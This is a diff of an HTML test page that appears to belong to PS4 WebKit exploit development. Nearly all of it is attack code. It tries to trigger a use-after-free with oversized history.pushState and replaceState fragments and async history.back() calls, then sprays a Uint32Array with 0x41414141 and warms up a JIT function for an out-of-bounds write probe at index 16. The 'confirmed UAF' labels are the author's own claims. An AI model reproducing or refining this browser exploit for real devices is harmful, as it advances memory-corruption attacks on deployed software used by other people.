@@ -1,104 +1,117 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit – Temporal Fragment UAF Probe</title>
+<title>UAF → JIT Intersection Probe</title>
 <style>
-body {
-    font-family: monospace;
-    background: #000;
-    color: #0f0;
-    padding: 20px;
-}
-button {
-    font-size: 16px;
-    padding: 12px 20px;
-    margin-bottom: 15px;
-}
-#log {
-    white-space: pre-wrap;
-    font-size: 12px;
-    border: 1px solid #0f0;
-    padding: 10px;
-    max-height: 500px;
-    overflow-y: auto;
-}
+body { font-family: monospace; background:#000; color:#0f0; }
+button { padding:10px; font-size:16px; margin:5px; }
+#log { white-space:pre-wrap; margin-top:10px; }
 </style>
 </head>
 <body>
 
-<h2>Temporal Fragment UAF – Minimal Confirmation Test</h2>
-<button onclick="run()">RUN TEST</button>
-
+<h2>UAF → TypedArray → JIT Intersection Test</h2>
+<button onclick="runTest()">RUN TEST</button>
 <div id="log"></div>
 
 <script>
 const logEl = document.getElementById("log");
-function log(m){ logEl.textContent += m + "\n"; }
-function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
+const log = m => logEl.textContent += m + "\n";
+const sleep = ms => new Promise(r=>setTimeout(r,ms));
 
-async function run(){
-    logEl.textContent = "";
-
-    const BASE = 977;
-    const STEP = 14461;
-    let size = BASE;
-
+/* ===============================
+   PHASE 1 — CONFIRMED UAF TRIGGER
+   =============================== */
+async function triggerUAF(){
     log("=== UAF TRIGGER START ===");
+    let size = 977;
+    const STEP = 14461;
 
-    // ----------------------------
-    // Phase 1 — Known-good UAF trigger
-    // ----------------------------
     for(let i=0;i<48;i++){
         let frag = "A".repeat(size);
         history.pushState({}, "", "#"+frag);
         history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));
         if(i % 6 === 0){
-            setTimeout(()=>history.back(), 0);
-            log("[ITER " + i + "] back() async");
+            setTimeout(()=>history.back(),0);
+            log(`[ITER ${i}] back() async`);
         }
         size += STEP;
         await sleep(5);
     }
-
     log(">>> UAF WINDOW <<<");
+}
 
-    // ----------------------------
-    // Phase 2 — Baseline read (NO allocations)
-    // ----------------------------
-    let url = document.URL;
+/* ===============================
+   PHASE 2 — BASELINE READ
+   =============================== */
+function baselineRead(){
+    log("\n=== BASELINE READ ===");
+    log("URL.length = " + document.URL.length);
+    log("charCodeAt(64) = " + document.URL.charCodeAt(64));
+}
 
-    log("");
-    log("=== BASELINE READ ===");
-    log("URL.length = " + url.length);
-    log("charCodeAt(32)  = " + url.charCodeAt(32));
-    log("charCodeAt(64)  = " + url.charCodeAt(64));
-    log("charCodeAt(128) = " + url.charCodeAt(128));
-    log("charCodeAt(256) = " + url.charCodeAt(256));
+/* ===============================
+   PHASE 3 — CREATE TYPEDARRAY
+   INSIDE UAF WINDOW
+   =============================== */
+function createTypedArray(){
+    log("\n=== TYPEDARRAY ALLOCATION ===");
+    const buf = new ArrayBuffer(0x40);
+    const u32 = new Uint32Array(buf);
 
-    // ----------------------------
-    // Phase 3 — Fragment collapse ONLY
-    // ----------------------------
-    log("");
-    log(">>> FRAGMENT COLLAPSE <<<");
-    location.hash = "#X";
+    for(let i=0;i<u32.length;i++)
+        u32[i] = 0x41414141;
 
-    // *** CRITICAL: same-frame read ***
-    let url2 = document.URL;
+    log("Uint32Array length = " + u32.length);
+    return u32;
+}
 
-    log("");
-    log("=== POST-COLLAPSE READ (SAME FRAME) ===");
-    log("URL.length = " + url2.length);
-    log("charCodeAt(32)  = " + url2.charCodeAt(32));
-    log("charCodeAt(64)  = " + url2.charCodeAt(64));
-    log("charCodeAt(128) = " + url2.charCodeAt(128));
-    log("charCodeAt(256) = " + url2.charCodeAt(256));
+/* ===============================
+   PHASE 4 — JIT OOB FUNCTION
+   =============================== */
+function jitFunc(arr, idx, val){
+    return arr[idx] = val;
+}
 
-    log("");
-    log("=== TEST END ===");
+function warmupJIT(arr){
+    for(let i=0;i<10000;i++)
+        jitFunc(arr, 0, 0x1337);
+}
+
+/* ===============================
+   PHASE 5 — PROBE
+   =============================== */
+function probe(arr){
+    log("\n=== JIT PROBE ===");
+    try{
+        const r = jitFunc(arr, 16, 0xdeadbeef);
+        log("write/read idx 16 = 0x" + r.toString(16));
+    }catch(e){
+        log("Exception: " + e);
+    }
+}
+
+/* ===============================
+   MAIN
+   =============================== */
+async function runTest(){
+    logEl.textContent = "";
+    await triggerUAF();
+    await sleep(120);
+
+    baselineRead();
+
+    const ta = createTypedArray();
+    warmupJIT(ta);
+    probe(ta);
+
+    log("\n=== POST READ ===");
+    log("URL.length = " + document.URL.length);
+    log("charCodeAt(64) = " + document.URL.charCodeAt(64));
+
+    log("\n=== TEST END ===");
 }
 </script>
-
 </body>
 </html>
